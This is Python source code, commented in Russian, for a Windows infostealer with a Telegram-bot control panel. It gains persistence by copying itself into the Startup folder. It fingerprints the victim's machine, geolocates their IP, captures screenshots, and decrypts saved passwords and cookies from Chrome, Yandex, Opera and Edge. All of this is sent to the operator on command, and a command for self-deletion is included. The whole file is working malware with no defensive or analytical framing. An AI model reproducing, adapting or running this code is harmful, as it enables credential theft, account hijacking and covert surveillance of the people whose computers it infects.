from ip2geotools.databases.noncommercial import DbIpCity
from PIL import ImageGrab
from uuid import getnode as get_mac 
from datetime import datetime
from time import sleep 
import win32crypt
import telebot 
import ip2geotools 
import platform 
import os 
import sys 
import requests 
import getpass 
import time 
import sqlite3
import shutil
import psutil

# Автозагрузка
file = sys.argv[0] 
file_name = os.path.basename(file) 
user_path = os.path.expanduser('~')

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}"):
        os.system(f'copy "{file}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')


#########################################################################
#                      Сбор информации о ПК жертвы                      #
#########################################################################
def get_data_pc():
    mac_address = get_mac() # получаем Mac-адрес компьютера
    op = platform.uname() # имя операционной системы 
    cpu = psutil.cpu_freq() # частота процессора 
    comp_data = f" Операционная система: {op.system}\n Процессор: {op.processor}\n Максимальная частота: {cpu.max:.2f} Mhz\n Минимальная частота: {cpu.min:.2f} Mhz\n Текущая частота: {cpu.current:.2f} Mhz\n Имя: {getpass.getuser()}\n Mac-адрес: {mac_address}\n"
    
    return comp_data

#########################################################################
#                               Геоданные                               #
#########################################################################
def get_location():
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key = "free")
    geo_data = f" IP-адрес: {response.ip_address}\n Страна: {response.country}\n Регион: {response.region}\n Город: {response.city}\n"
    
    return geo_data 

#########################################################################
#                      Делаем снимки рабочего стола                     #
#########################################################################
def get_screenshot():
    screen = ImageGrab.grab()
    screen.save("screen.png") 
    

#########################################################################
#                      Вытаскиваем пароли Google Chrome                 #
#########################################################################
def get_passwd_chrome():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data"):
        # подключаемся к базе данных
        
        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")

            for el in curs0r.fetchall():
                url = el[0]
                login = el[1]
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|#####|"

        return f"---------------------------- Пароли Google Chrome ----------------------------\n{result}"
    return "Google Chrome не установлен или не найден Login Data"

    
#########################################################################
#                      Вытаскиваем пароли Yandex                        #
#########################################################################
def get_passwd_yandex():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Login Data"):
        # подключаемся к базе данных
     
        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for el in curs0r.fetchall():
                url = el[0]
                login = el[1]
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|######|"
        return f"---------------------------- Пароли Yandex Browser ----------------------------\n{result}"
    return "Яндекс Браузер не установлен или не найден Login Data" 

#########################################################################
#                      Вытаскиваем пароли Opera                         #
#########################################################################
def get_passwd_opera():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Login Data"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for el in curs0r.fetchall():
                url = el[0]
                login = el[1] 
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- Пароли Opera ----------------------------\n{result}"
    return "Opera не установлен или не найден Login Data"

#########################################################################
#                   Вытаскиваем пароли Microsoft Edge                   #
#########################################################################
def get_passwd_edge():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Login Data"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for el in curs0r.fetchall():
                url = el[0]
                login = el[1] 
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- Пароли Microsoft Edge ----------------------------\n{result}"
    return "Microsoft Edge не установлен или найден Login Data"

#########################################################################
#                      Вытаскиваем cookie Google Chrome                 #
#########################################################################
def get_cookie_chrome():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[1]
                cookie_name = el[2] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Google Chrome ----------------------------\n{result}"
    return "Не найдены Cookies Google Chrome"
    

#########################################################################
#                      Вытаскиваем cookie Yandex                        #
#########################################################################
def get_cookie_yandex():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[0]
                cookie_name = el[1] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Yandex Browser ----------------------------\n{result}"
    return "Не найдены Cookies Yandex Browser"

#########################################################################
#                       Вытаскиваем cookie Opera                        #
#########################################################################
def get_cookie_opera():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[1]
                cookie_name = el[2] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Opera ----------------------------\n{result}"
    return "Не найдены Cookies Opera"
    
#########################################################################
#                     Вытаскиваем cookie Microsoft Edge                 #
#########################################################################
def get_cookie_edge():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[1]
                cookie_name = el[2] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Microsoft Edge ----------------------------\n{result}"
    return "Не найдены Cookies Microsoft Edge"

#########################################################################
#                        Панель управления                              #
#########################################################################

def control_panel():
    bot = telebot.TeleBot('TOKEN')

    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        bot.send_message(id, "Компьютер инфицирован! Развлекайся!")
        sleep(3)
        bot.reply_to(message, "Команды: \n 1 - получить скриншот; \n 2 - получить геоданные;\n 3 - получить данные о ПК;\n 4 - получить пароли с браузеров;\n 5 - узнать местоположение программы;\n 6 - получить кукиз из браузеров;\n 7 - самоуничтожение;\n")
    
    
    @bot.message_handler(content_types=['text'])
    def get_text_messages(message):
        if message.text == "1":
            get_screenshot()
            bot.send_photo(id, photo = open("screen.png", "rb"))
            os.remove("screen.png") 

        if message.text == "2": bot.send_message(id, get_location())
        if message.text == "3": bot.send_message(id, get_data_pc())
        if message.text == "4":
            bot.send_message(id, get_passwd_yandex())
            bot.send_message(id, get_passwd_chrome())
            bot.send_message(id, get_passwd_opera())
            bot.send_message(id, get_passwd_edge())

        if message.text == "5":
                path = os.path.abspath(__file__)
                bot.send_message(id, path) 

        if message.text == "6":
            bot.send_message(id, get_cookie_yandex())
            bot.send_message(id, get_cookie_chrome())
            bot.send_message(id, get_cookie_opera())
            bot.send_message(id, get_cookie_edge())

        if message.text == "7":
                file = sys.argv[0]
                bot.send_message(id, "Программа удалена!")
                os.remove(file) 
            
    bot.polling(none_stop = True)

control_panel()

            
            
    
    
    
    
